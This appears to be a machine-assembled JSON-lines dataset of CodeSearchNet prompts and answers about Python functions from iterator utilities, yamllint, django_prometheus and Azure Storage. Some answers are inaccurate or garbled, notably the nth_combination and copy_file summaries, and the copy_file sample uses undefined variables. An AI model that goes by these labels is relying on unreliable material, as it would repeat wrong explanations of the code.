{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef time_limited(limit_seconds, iterable):\n    if limit_seconds < 0:\n        raise ValueError('limit_seconds must be positive')\n\n    start_time = monotonic()\n    for item in iterable:\n        if monotonic() - start_time > limit_seconds:\n            break\n        yield item", "response": "Yields items from iterable until limit_seconds have passed."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the first item in the iterable or raises ValueError by default.", "response": "def only(iterable, default=None, too_long=None):\n    \"\"\"If *iterable* has only one item, return it.\n    If it has zero items, return *default*.\n    If it has more than one item, raise the exception given by *too_long*,\n    which is ``ValueError`` by default.\n\n    >>> only([], default='missing')\n    'missing'\n    >>> only([1])\n    1\n    >>> only([1, 2])  # doctest: +IGNORE_EXCEPTION_DETAIL\n    Traceback (most recent call last):\n    ...\n    ValueError: too many items in iterable (expected 1)'\n    >>> only([1, 2], too_long=TypeError)  # doctest: +IGNORE_EXCEPTION_DETAIL\n    Traceback (most recent call last):\n    ...\n    TypeError\n\n    Note that :func:`only` attempts to advance *iterable* twice to ensure there\n    is only one item.  See :func:`spy` or :func:`peekable` to check\n    iterable contents less destructively.\n    \"\"\"\n    it = iter(iterable)\n    value = next(it, default)\n\n    try:\n        next(it)\n    except StopIteration:\n        pass\n    else:\n        raise too_long or ValueError('too many items in iterable (expected 1)')\n\n    return value"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the next item from the iterator.", "response": "def peek(self, default=_marker):\n        \"\"\"Return the item that will be next returned from ``next()``.\n\n        Return ``default`` if there are no items left. If ``default`` is not\n        provided, raise ``StopIteration``.\n\n        \"\"\"\n        if not self._cache:\n            try:\n                self._cache.append(next(self._it))\n            except StopIteration:\n                if default is _marker:\n                    raise\n                return default\n        return self._cache[0]"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_values(self, value):\n        while True:\n            # If we've cached some items that match the target value, emit\n            # the first one and evict it from the cache.\n            if self._cache[value]:\n                yield self._cache[value].popleft()\n            # Otherwise we need to advance the parent iterator to search for\n            # a matching item, caching the rest.\n            else:\n                while True:\n                    try:\n                        item = next(self._it)\n                    except StopIteration:\n                        return\n                    item_value = self._key(item)\n                    if item_value == value:\n                        yield item\n                        break\n                    elif self._validator(item_value):\n                        self._cache[item_value].append(item)", "response": "Yields the items that match the target value."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncall func with *args* repeatedly returning an iterable over the results.", "response": "def repeatfunc(func, times=None, *args):\n    \"\"\"Call *func* with *args* repeatedly, returning an iterable over the\n    results.\n\n    If *times* is specified, the iterable will terminate after that many\n    repetitions:\n\n        >>> from operator import add\n        >>> times = 4\n        >>> args = 3, 5\n        >>> list(repeatfunc(add, times, *args))\n        [8, 8, 8, 8]\n\n    If *times* is ``None`` the iterable will not terminate:\n\n        >>> from random import randrange\n        >>> times = None\n        >>> args = 1, 11\n        >>> take(6, repeatfunc(randrange, times, *args))  # doctest:+SKIP\n        [2, 4, 8, 1, 8, 4]\n\n    \"\"\"\n    if times is None:\n        return starmap(func, repeat(args))\n    return starmap(func, repeat(args, times))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef grouper(iterable, n, fillvalue=None):\n    if isinstance(iterable, int):\n        warnings.warn(\n            \"grouper expects iterable as first parameter\",\n            DeprecationWarning,\n        )\n        n, iterable = iterable, n\n    args = [iter(iterable)] * n\n    return zip_longest(fillvalue=fillvalue, *args)", "response": "Group data into fixed - length chunks or blocks."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef unique_everseen(iterable, key=None):\n    seenset = set()\n    seenset_add = seenset.add\n    seenlist = []\n    seenlist_add = seenlist.append\n    if key is None:\n        for element in iterable:\n            try:\n                if element not in seenset:\n                    seenset_add(element)\n                    yield element\n            except TypeError:\n                if element not in seenlist:\n                    seenlist_add(element)\n                    yield element\n    else:\n        for element in iterable:\n            k = key(element)\n            try:\n                if k not in seenset:\n                    seenset_add(k)\n                    yield element\n            except TypeError:\n                if k not in seenlist:\n                    seenlist_add(k)\n                    yield element", "response": "Yield unique elements preserving order."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef unique_justseen(iterable, key=None):\n    return map(next, map(operator.itemgetter(1), groupby(iterable, key)))", "response": "Yields elements in order ignoring serial duplicates"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef random_product(*args, **kwds):\n    pools = [tuple(pool) for pool in args] * kwds.get('repeat', 1)\n    return tuple(choice(pool) for pool in pools)", "response": "Draw an item at random from each of the input iterables."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef random_permutation(iterable, r=None):\n    pool = tuple(iterable)\n    r = len(pool) if r is None else r\n    return tuple(sample(pool, r))", "response": "Return a random length permutation of the elements in iterable."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef nth_combination(iterable, r, index):\n    pool = tuple(iterable)\n    n = len(pool)\n    if (r < 0) or (r > n):\n        raise ValueError\n\n    c = 1\n    k = min(r, n - r)\n    for i in range(1, k + 1):\n        c = c * (n - k + i) // i\n\n    if index < 0:\n        index += c\n\n    if (index < 0) or (index >= c):\n        raise IndexError\n\n    result = []\n    while r:\n        c, n, r = c * r // n, n - 1, r - 1\n        while index >= c:\n            index -= c\n            c, n = c * (n - r) // n, n - 1\n        result.append(pool[-1 - n])\n\n    return tuple(result)", "response": "Equivalent to list. nth_combination except that the first element of the iterable is sorted by the index."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nlint a YAML source.", "response": "def run(input, conf, filepath=None):\n    \"\"\"Lints a YAML source.\n\n    Returns a generator of LintProblem objects.\n\n    :param input: buffer, string or stream to read from\n    :param conf: yamllint configuration object\n    \"\"\"\n    if conf.is_file_ignored(filepath):\n        return ()\n\n    if isinstance(input, (type(b''), type(u''))):  # compat with Python 2 & 3\n        return _run(input, conf, filepath)\n    elif hasattr(input, 'read'):  # Python 2's file or Python 3's io.IOBase\n        # We need to have everything in memory to parse correctly\n        content = input.read()\n        return _run(content, conf, filepath)\n    else:\n        raise TypeError('input should be a string or a stream')"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfinds the indent of the line the token starts in.", "response": "def get_line_indent(token):\n    \"\"\"Finds the indent of the line the token starts in.\"\"\"\n    start = token.start_mark.buffer.rfind('\\n', 0,\n                                          token.start_mark.pointer) + 1\n    content = start\n    while token.start_mark.buffer[content] == ' ':\n        content += 1\n    return content - start"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_real_end_line(token):\n    end_line = token.end_mark.line + 1\n\n    if not isinstance(token, yaml.ScalarToken):\n        return end_line\n\n    pos = token.end_mark.pointer - 1\n    while (pos >= token.start_mark.pointer - 1 and\n           token.end_mark.buffer[pos] in string.whitespace):\n        if token.end_mark.buffer[pos] == '\\n':\n            end_line -= 1\n        pos -= 1\n    return end_line", "response": "Finds the line on which the token really ends."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef comments_between_tokens(token1, token2):\n    if token2 is None:\n        buf = token1.end_mark.buffer[token1.end_mark.pointer:]\n    elif (token1.end_mark.line == token2.start_mark.line and\n          not isinstance(token1, yaml.StreamStartToken) and\n          not isinstance(token2, yaml.StreamEndToken)):\n        return\n    else:\n        buf = token1.end_mark.buffer[token1.end_mark.pointer:\n                                     token2.start_mark.pointer]\n\n    line_no = token1.end_mark.line + 1\n    column_no = token1.end_mark.column + 1\n    pointer = token1.end_mark.pointer\n\n    comment_before = None\n    for line in buf.split('\\n'):\n        pos = line.find('#')\n        if pos != -1:\n            comment = Comment(line_no, column_no + pos,\n                              token1.end_mark.buffer, pointer + pos,\n                              token1, token2, comment_before)\n            yield comment\n\n            comment_before = comment\n\n        pointer += len(line) + 1\n        line_no += 1\n        column_no = 1", "response": "Find all comments between two tokens"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef token_or_comment_or_line_generator(buffer):\n    tok_or_com_gen = token_or_comment_generator(buffer)\n    line_gen = line_generator(buffer)\n\n    tok_or_com = next(tok_or_com_gen, None)\n    line = next(line_gen, None)\n\n    while tok_or_com is not None or line is not None:\n        if tok_or_com is None or (line is not None and\n                                  tok_or_com.line_no > line.line_no):\n            yield line\n            line = next(line_gen, None)\n        else:\n            yield tok_or_com\n            tok_or_com = next(tok_or_com_gen, None)", "response": "Generator that mixes tokens and lines by line number"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nexports counts of unapplied migrations.", "response": "def ExportMigrations():\n    \"\"\"Exports counts of unapplied migrations.\n\n    This is meant to be called during app startup, ideally by\n    django_prometheus.apps.AppConfig.\n    \"\"\"\n\n    # Import MigrationExecutor lazily. MigrationExecutor checks at\n    # import time that the apps are ready, and they are not when\n    # django_prometheus is imported. ExportMigrations() should be\n    # called in AppConfig.ready(), which signals that all apps are\n    # ready.\n    from django.db.migrations.executor import MigrationExecutor\n\n    if 'default' in connections and (\n            type(connections['default']) == DatabaseWrapper):\n        # This is the case where DATABASES = {} in the configuration,\n        # i.e. the user is not using any databases. Django \"helpfully\"\n        # adds a dummy database and then throws when you try to\n        # actually use it. So we don't do anything, because trying to\n        # export stats would crash the app on startup.\n        return\n    for alias in connections.databases:\n        executor = MigrationExecutor(connections[alias])\n        ExportMigrationsForDatabase(alias, executor)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef ExportingCursorWrapper(cursor_class, alias, vendor):\n\n    class CursorWrapper(cursor_class):\n        \"\"\"Extends the base CursorWrapper to count events.\"\"\"\n\n        def execute(self, *args, **kwargs):\n            execute_total.labels(alias, vendor).inc()\n            with ExceptionCounterByType(errors_total, extra_labels={\n                    'alias': alias, 'vendor': vendor}):\n                return super(CursorWrapper, self).execute(*args, **kwargs)\n\n        def executemany(self, query, param_list, *args, **kwargs):\n            execute_total.labels(alias, vendor).inc(len(param_list))\n            execute_many_total.labels(alias, vendor).inc(len(param_list))\n            with ExceptionCounterByType(errors_total, extra_labels={\n                    'alias': alias, 'vendor': vendor}):\n                return super(CursorWrapper, self).executemany(\n                    query, param_list, *args, **kwargs)\n    return CursorWrapper", "response": "Returns a CursorWrapper class that knows its database s alias and vendor name."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ExportModelOperationsMixin(model_name):\n    # Force create the labels for this model in the counters. This\n    # is not necessary but it avoids gaps in the aggregated data.\n    model_inserts.labels(model_name)\n    model_updates.labels(model_name)\n    model_deletes.labels(model_name)\n\n    class Mixin(object):\n        def _do_insert(self, *args, **kwargs):\n            model_inserts.labels(model_name).inc()\n            return super(Mixin, self)._do_insert(*args, **kwargs)\n\n        def _do_update(self, *args, **kwargs):\n            model_updates.labels(model_name).inc()\n            return super(Mixin, self)._do_update(*args, **kwargs)\n\n        def delete(self, *args, **kwargs):\n            model_deletes.labels(model_name).inc()\n            return super(Mixin, self).delete(*args, **kwargs)\n    return Mixin", "response": "Returns a mixin for models to export counters for lifecycle operations."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a list of count powers of logbase.", "response": "def PowersOf(logbase, count, lower=0, include_zero=True):\n    \"\"\"Returns a list of count powers of logbase (from logbase**lower).\"\"\"\n    if not include_zero:\n        return [logbase ** i for i in range(lower, count+lower)]\n    else:\n        return [0] + [logbase ** i for i in range(lower, count+lower)]"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef SetupPrometheusEndpointOnPort(port, addr=''):\n    assert os.environ.get('RUN_MAIN') != 'true', (\n        'The thread-based exporter can\\'t be safely used when django\\'s '\n        'autoreloader is active. Use the URL exporter, or start django '\n        'with --noreload. See documentation/exports.md.')\n    prometheus_client.start_http_server(port, addr=addr)", "response": "Starts a Prometheus server on a given port."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nlike SetupPrometheusEndpointOnPort, but tries several ports. This is useful when you're running Django as a WSGI application with multiple processes and you want Prometheus to discover all workers. Each worker will grab a port and you can use Prometheus to aggregate across workers. port_range may be any iterable object that contains a list of ports. Typically this would be an xrange of contiguous ports. As soon as one port is found that can serve, use this one and stop trying. The same caveats regarding autoreload apply. Do not use this when Django's autoreloader is active.", "response": "def SetupPrometheusEndpointOnPortRange(port_range, addr=''):\n    \"\"\"Like SetupPrometheusEndpointOnPort, but tries several ports.\n\n    This is useful when you're running Django as a WSGI application\n    with multiple processes and you want Prometheus to discover all\n    workers. Each worker will grab a port and you can use Prometheus\n    to aggregate across workers.\n\n    port_range may be any iterable object that contains a list of\n    ports. Typically this would be an xrange of contiguous ports.\n\n    As soon as one port is found that can serve, use this one and stop\n    trying.\n\n    The same caveats regarding autoreload apply. Do not use this when\n    Django's autoreloader is active.\n\n    \"\"\"\n    assert os.environ.get('RUN_MAIN') != 'true', (\n        'The thread-based exporter can\\'t be safely used when django\\'s '\n        'autoreloader is active. Use the URL exporter, or start django '\n        'with --noreload. See documentation/exports.md.')\n    for port in port_range:\n        try:\n            httpd = HTTPServer((addr, port), prometheus_client.MetricsHandler)\n        except (OSError, socket.error):\n            # Python 2 raises socket.error, in Python 3 socket.error is an\n            # alias for OSError\n            continue  # Try next port\n        thread = PrometheusEndpointServer(httpd)\n        thread.daemon = True\n        thread.start()\n        logger.info('Exporting Prometheus /metrics/ on port %s' % port)\n        return"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nexporting metrics so Prometheus can collect them.", "response": "def SetupPrometheusExportsFromConfig():\n    \"\"\"Exports metrics so Prometheus can collect them.\"\"\"\n    port = getattr(settings, 'PROMETHEUS_METRICS_EXPORT_PORT', None)\n    port_range = getattr(\n        settings, 'PROMETHEUS_METRICS_EXPORT_PORT_RANGE', None)\n    addr = getattr(settings, 'PROMETHEUS_METRICS_EXPORT_ADDRESS', '')\n    if port_range:\n        SetupPrometheusEndpointOnPortRange(port_range, addr)\n    elif port:\n        SetupPrometheusEndpointOnPort(port, addr)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef ExportToDjangoView(request):\n    if 'prometheus_multiproc_dir' in os.environ:\n        registry = prometheus_client.CollectorRegistry()\n        multiprocess.MultiProcessCollector(registry)\n    else:\n        registry = prometheus_client.REGISTRY\n    metrics_page = prometheus_client.generate_latest(registry)\n    return HttpResponse(\n        metrics_page,\n        content_type=prometheus_client.CONTENT_TYPE_LATEST)", "response": "Exports the metrics page to a Django view."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _perform_request(self, request, parser=None, parser_args=None, operation_context=None, expected_errors=None):\n        '''\n        Sends the request and return response. Catches HTTPError and hands it\n        to error handler\n        '''\n        operation_context = operation_context or _OperationContext()\n        retry_context = RetryContext()\n        retry_context.is_emulated = self.is_emulated\n\n        # if request body is a stream, we need to remember its current position in case retries happen\n        if hasattr(request.body, 'read'):\n            try:\n                retry_context.body_position = request.body.tell()\n            except (AttributeError, UnsupportedOperation):\n                # if body position cannot be obtained, then retries will not work\n                pass\n\n        # Apply the appropriate host based on the location mode\n        self._apply_host(request, operation_context, retry_context)\n\n        # Apply common settings to the request\n        _update_request(request, self._X_MS_VERSION, self._USER_AGENT_STRING)\n        client_request_id_prefix = str.format(\"Client-Request-ID={0}\", request.headers['x-ms-client-request-id'])\n\n        while True:\n            try:\n                try:\n                    # Execute the request callback \n                    if self.request_callback:\n                        self.request_callback(request)\n\n                    # Add date and auth after the callback so date doesn't get too old and \n                    # authentication is still correct if signed headers are added in the request \n                    # callback. This also ensures retry policies with long back offs \n                    # will work as it resets the time sensitive headers.\n                    _add_date_header(request)\n\n                    try:\n                        # request can be signed individually\n                        self.authentication.sign_request(request)\n                    except AttributeError:\n                        # session can also be signed\n                        self.request_session = self.authentication.signed_session(self.request_session)\n\n                    # Set the request context\n                    retry_context.request = request\n\n                    # Log the request before it goes out\n                    # Avoid unnecessary scrubbing if the logger is not on\n                    if logger.isEnabledFor(logging.INFO):\n                        logger.info(\"%s Outgoing request: Method=%s, Path=%s, Query=%s, Headers=%s.\",\n                                    client_request_id_prefix,\n                                    request.method,\n                                    request.path,\n                                    self._scrub_query_parameters(request.query),\n                                    str(self._scrub_headers(request.headers)).replace('\\n', ''))\n\n                    # Perform the request\n                    response = self._httpclient.perform_request(request)\n\n                    # Execute the response callback\n                    if self.response_callback:\n                        self.response_callback(response)\n\n                    # Set the response context\n                    retry_context.response = response\n\n                    # Log the response when it comes back\n                    logger.info(\"%s Receiving Response: \"\n                                \"%s, HTTP Status Code=%s, Message=%s, Headers=%s.\",\n                                client_request_id_prefix,\n                                self.extract_date_and_request_id(retry_context),\n                                response.status,\n                                response.message,\n                                str(response.headers).replace('\\n', ''))\n\n                    # Parse and wrap HTTP errors in AzureHttpError which inherits from AzureException\n                    if response.status >= 300:\n                        # This exception will be caught by the general error handler\n                        # and raised as an azure http exception\n                        _http_error_handler(\n                            HTTPError(response.status, response.message, response.headers, response.body))\n\n                    # Parse the response\n                    if parser:\n                        if parser_args:\n                            args = [response]\n                            args.extend(parser_args)\n                            return parser(*args)\n                        else:\n                            return parser(response)\n                    else:\n                        return\n                except AzureException as ex:\n                    retry_context.exception = ex\n                    raise ex\n                except Exception as ex:\n                    retry_context.exception = ex\n                    raise _wrap_exception(ex, AzureException)\n\n            except AzureException as ex:\n                # only parse the strings used for logging if logging is at least enabled for CRITICAL\n                exception_str_in_one_line = ''\n                status_code = ''\n                timestamp_and_request_id = ''\n                if logger.isEnabledFor(logging.CRITICAL):\n                    exception_str_in_one_line = str(ex).replace('\\n', '')\n                    status_code = retry_context.response.status if retry_context.response is not None else 'Unknown'\n                    timestamp_and_request_id = self.extract_date_and_request_id(retry_context)\n\n                # if the http error was expected, we should short-circuit\n                if isinstance(ex, AzureHttpError) and expected_errors is not None and ex.error_code in expected_errors:\n                    logger.info(\"%s Received expected http error: \"\n                                \"%s, HTTP status code=%s, Exception=%s.\",\n                                client_request_id_prefix,\n                                timestamp_and_request_id,\n                                status_code,\n                                exception_str_in_one_line)\n                    raise ex\n                elif isinstance(ex, AzureSigningError):\n                    logger.info(\"%s Unable to sign the request: Exception=%s.\",\n                                client_request_id_prefix,\n                                exception_str_in_one_line)\n                    raise ex\n\n                logger.info(\"%s Operation failed: checking if the operation should be retried. \"\n                            \"Current retry count=%s, %s, HTTP status code=%s, Exception=%s.\",\n                            client_request_id_prefix,\n                            retry_context.count if hasattr(retry_context, 'count') else 0,\n                            timestamp_and_request_id,\n                            status_code,\n                            exception_str_in_one_line)\n\n                # Decryption failures (invalid objects, invalid algorithms, data unencrypted in strict mode, etc)\n                # will not be resolved with retries.\n                if str(ex) == _ERROR_DECRYPTION_FAILURE:\n                    logger.error(\"%s Encountered decryption failure: this cannot be retried. \"\n                                 \"%s, HTTP status code=%s, Exception=%s.\",\n                                 client_request_id_prefix,\n                                 timestamp_and_request_id,\n                                 status_code,\n                                 exception_str_in_one_line)\n                    raise ex\n\n                # Determine whether a retry should be performed and if so, how \n                # long to wait before performing retry.\n                retry_interval = self.retry(retry_context)\n                if retry_interval is not None:\n                    # Execute the callback\n                    if self.retry_callback:\n                        self.retry_callback(retry_context)\n\n                    logger.info(\n                        \"%s Retry policy is allowing a retry: Retry count=%s, Interval=%s.\",\n                        client_request_id_prefix,\n                        retry_context.count,\n                        retry_interval)\n\n                    # Sleep for the desired retry interval\n                    sleep(retry_interval)\n                else:\n                    logger.error(\"%s Retry policy did not allow for a retry: \"\n                                 \"%s, HTTP status code=%s, Exception=%s.\",\n                                 client_request_id_prefix,\n                                 timestamp_and_request_id,\n                                 status_code,\n                                 exception_str_in_one_line)\n                    raise ex\n            finally:\n                # If this is a location locked operation and the location is not set, \n                # this is the first request of that operation. Set the location to \n                # be used for subsequent requests in the operation.\n                if operation_context.location_lock and not operation_context.host_location:\n                    # note: to cover the emulator scenario, the host_location is grabbed\n                    # from request.host_locations(which includes the dev account name)\n                    # instead of request.host(which at this point no longer includes the dev account name)\n                    operation_context.host_location = {\n                        retry_context.location_mode: request.host_locations[retry_context.location_mode]}", "response": "Perform the request and return the response."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef copy_file(self):\n        share_name = self._create_share()\n        directory_name = self._create_directory(share_name)\n        source_file_name = self._get_file_reference()\n        self.service.create_file(share_name, directory_name, source_file_name, 512)\n\n        # Basic\n        # Copy the file from the directory to the root of the share\n        source = self.service.make_file_url(share_name, directory_name, source_file_name)\n        copy = self.service.copy_file(share_name, None, 'file1copy', source)\n\n        # Poll for copy completion\n        while copy.status != 'success':\n            count = count + 1\n            if count > 5:\n                print('Timed out waiting for async copy to complete.')\n            time.sleep(30)\n            copy = self.service.get_file_properties(share_name, dir_name, 'file1copy').properties.copy\n\n        # With SAS from a remote account to local file\n        # Commented out as remote share, directory, file, and sas would need to be created\n        '''\n        source_file_url = self.service.make_file_url(\n            remote_share_name,\n            remote_directory_name,\n            remote_file_name,\n            sas_token=remote_sas_token,\n        )\n        copy = self.service.copy_file(destination_sharename, \n                                 destination_directory_name, \n                                 destination_file_name, \n                                 source_file_url)\n        '''\n\n        # Abort copy\n        # Commented out as this involves timing the abort to be sent while the copy is still running\n        # Abort copy is useful to do along with polling\n        # self.service.abort_copy_file(share_name, dir_name, file_name, copy.id)\n\n        self.service.delete_share(share_name)", "response": "Copy a file from the local file to the remote file"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the path to access a resource in a given share.", "response": "def _get_path(share_name=None, directory_name=None, file_name=None):\n    '''\n    Creates the path to access a file resource.\n\n    share_name:\n        Name of share.\n    directory_name:\n        The path to the directory.\n    file_name:\n        Name of file.\n    '''\n    if share_name and directory_name and file_name:\n        return '/{0}/{1}/{2}'.format(\n            _str(share_name),\n            _str(directory_name),\n            _str(file_name))\n    elif share_name and directory_name:\n        return '/{0}/{1}'.format(\n            _str(share_name),\n            _str(directory_name))\n    elif share_name and file_name:\n        return '/{0}/{1}'.format(\n            _str(share_name),\n            _str(file_name))\n    elif share_name:\n        return '/{0}'.format(_str(share_name))\n    else:\n        return '/'"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _convert_xml_to_queues(response):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <EnumerationResults ServiceEndpoint=\"https://myaccount.queue.core.windows.net/\">\n      <Prefix>string-value</Prefix>\n      <Marker>string-value</Marker>\n      <MaxResults>int-value</MaxResults>\n      <Queues>\n        <Queue>\n          <Name>string-value</Name>\n          <Metadata>\n            <metadata-name>value</metadata-name>\n          </Metadata>\n        </Queue>\n      <NextMarker />\n    </EnumerationResults>\n    '''\n    if response is None or response.body is None:\n        return None\n\n    queues = _list()\n    list_element = ETree.fromstring(response.body)\n\n    # Set next marker\n    next_marker = list_element.findtext('NextMarker') or None\n    setattr(queues, 'next_marker', next_marker)\n\n    queues_element = list_element.find('Queues')\n\n    for queue_element in queues_element.findall('Queue'):\n        # Name element\n        queue = Queue()\n        queue.name = queue_element.findtext('Name')\n\n        # Metadata\n        metadata_root_element = queue_element.find('Metadata')\n        if metadata_root_element is not None:\n            queue.metadata = dict()\n            for metadata_element in metadata_root_element:\n                queue.metadata[metadata_element.tag] = metadata_element.text\n\n        # Add queue to list\n        queues.append(queue)\n\n    return queues", "response": "Convert XML response to queues."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert XML response to QueueMessagesList.", "response": "def _convert_xml_to_queue_messages(response, decode_function, require_encryption, key_encryption_key, resolver,\n                                   content=None):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <QueueMessagesList>\n        <QueueMessage>\n          <MessageId>string-message-id</MessageId>\n          <InsertionTime>insertion-time</InsertionTime>\n          <ExpirationTime>expiration-time</ExpirationTime>\n          <PopReceipt>opaque-string-receipt-data</PopReceipt>\n          <TimeNextVisible>time-next-visible</TimeNextVisible>\n          <DequeueCount>integer</DequeueCount>\n          <MessageText>message-body</MessageText>\n        </QueueMessage>\n    </QueueMessagesList>\n    '''\n    if response is None or response.body is None:\n        return None\n\n    messages = list()\n    list_element = ETree.fromstring(response.body)\n\n    for message_element in list_element.findall('QueueMessage'):\n        message = QueueMessage()\n\n        message.id = message_element.findtext('MessageId')\n\n        dequeue_count = message_element.findtext('DequeueCount')\n        if dequeue_count is not None:\n            message.dequeue_count = _to_int(dequeue_count)\n\n        # content is not returned for put_message\n        if content is not None:\n            message.content = content\n        else:\n            message.content = message_element.findtext('MessageText')\n            if (key_encryption_key is not None) or (resolver is not None):\n                message.content = _decrypt_queue_message(message.content, require_encryption,\n                                                         key_encryption_key, resolver)\n            message.content = decode_function(message.content)\n\n        message.insertion_time = parser.parse(message_element.findtext('InsertionTime'))\n        message.expiration_time = parser.parse(message_element.findtext('ExpirationTime'))\n\n        message.pop_receipt = message_element.findtext('PopReceipt')\n\n        time_next_visible = message_element.find('TimeNextVisible')\n        if time_next_visible is not None:\n            message.time_next_visible = parser.parse(time_next_visible.text)\n\n        # Add message to list\n        messages.append(message)\n\n    return messages"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nparsing a snapshot share response.", "response": "def _parse_snapshot_share(response, name):\n    '''\n    Extracts snapshot return header.\n    '''\n    snapshot = response.headers.get('x-ms-snapshot')\n\n    return _parse_share(response, name, snapshot)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _convert_xml_to_shares(response):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <EnumerationResults AccountName=\"https://myaccount.file.core.windows.net\">\n      <Prefix>string-value</Prefix>\n      <Marker>string-value</Marker>\n      <MaxResults>int-value</MaxResults>\n      <Shares>\n        <Share>\n          <Name>share-name</Name>\n          <Snapshot>date-time-value</Snapshot>\n          <Properties>\n            <Last-Modified>date/time-value</Last-Modified>\n            <Etag>etag</Etag>\n            <Quota>max-share-size</Quota>\n          </Properties>\n          <Metadata>\n            <metadata-name>value</metadata-name>\n          </Metadata>\n        </Share>\n      </Shares>\n      <NextMarker>marker-value</NextMarker>\n    </EnumerationResults>\n    '''\n    if response is None or response.body is None:\n        return None\n\n    shares = _list()\n    list_element = ETree.fromstring(response.body)\n\n    # Set next marker\n    next_marker = list_element.findtext('NextMarker') or None\n    setattr(shares, 'next_marker', next_marker)\n\n    shares_element = list_element.find('Shares')\n\n    for share_element in shares_element.findall('Share'):\n        # Name element\n        share = Share()\n        share.name = share_element.findtext('Name')\n\n        # Snapshot\n        share.snapshot = share_element.findtext('Snapshot')\n\n        # Metadata\n        metadata_root_element = share_element.find('Metadata')\n        if metadata_root_element is not None:\n            share.metadata = dict()\n            for metadata_element in metadata_root_element:\n                share.metadata[metadata_element.tag] = metadata_element.text\n\n        # Properties\n        properties_element = share_element.find('Properties')\n        share.properties.last_modified = parser.parse(properties_element.findtext('Last-Modified'))\n        share.properties.etag = properties_element.findtext('Etag')\n        share.properties.quota = int(properties_element.findtext('Quota'))\n\n        # Add share to list\n        shares.append(share)\n\n    return shares", "response": "Convert XML response to shares."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconvert XML response to directories and files.", "response": "def _convert_xml_to_directories_and_files(response):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <EnumerationResults ServiceEndpoint=\"https://myaccount.file.core.windows.net/\" ShareName=\"myshare\" DirectoryPath=\"directory-path\">\n      <Marker>string-value</Marker>\n      <MaxResults>int-value</MaxResults>\n      <Entries>\n        <File>\n          <Name>file-name</Name>\n          <Properties>\n            <Content-Length>size-in-bytes</Content-Length>\n          </Properties>\n        </File>\n        <Directory>\n          <Name>directory-name</Name>\n        </Directory>\n      </Entries>\n      <NextMarker />\n    </EnumerationResults>\n    '''\n    if response is None or response.body is None:\n        return None\n\n    entries = _list()\n    list_element = ETree.fromstring(response.body)\n\n    # Set next marker\n    next_marker = list_element.findtext('NextMarker') or None\n    setattr(entries, 'next_marker', next_marker)\n\n    entries_element = list_element.find('Entries')\n\n    for file_element in entries_element.findall('File'):\n        # Name element\n        file = File()\n        file.name = file_element.findtext('Name')\n\n        # Properties\n        properties_element = file_element.find('Properties')\n        file.properties.content_length = int(properties_element.findtext('Content-Length'))\n\n        # Add file to list\n        entries.append(file)\n\n    for directory_element in entries_element.findall('Directory'):\n        # Name element\n        directory = Directory()\n        directory.name = directory_element.findtext('Name')\n\n        # Add directory to list\n        entries.append(directory)\n\n    return entries"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _convert_xml_to_ranges(response):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <Ranges>\n      <Range>\n        <Start>Start Byte</Start>\n        <End>End Byte</End>\n      </Range>\n      <Range>\n        <Start>Start Byte</Start>\n        <End>End Byte</End>\n      </Range>\n    </Ranges>\n    '''\n    if response is None or response.body is None:\n        return None\n\n    ranges = list()\n    ranges_element = ETree.fromstring(response.body)\n\n    for range_element in ranges_element.findall('Range'):\n        # Parse range\n        range = FileRange(int(range_element.findtext('Start')), int(range_element.findtext('End')))\n\n        # Add range to list\n        ranges.append(range)\n\n    return ranges", "response": "Convert the response body of a HTTP request to a list of FileRanges."}
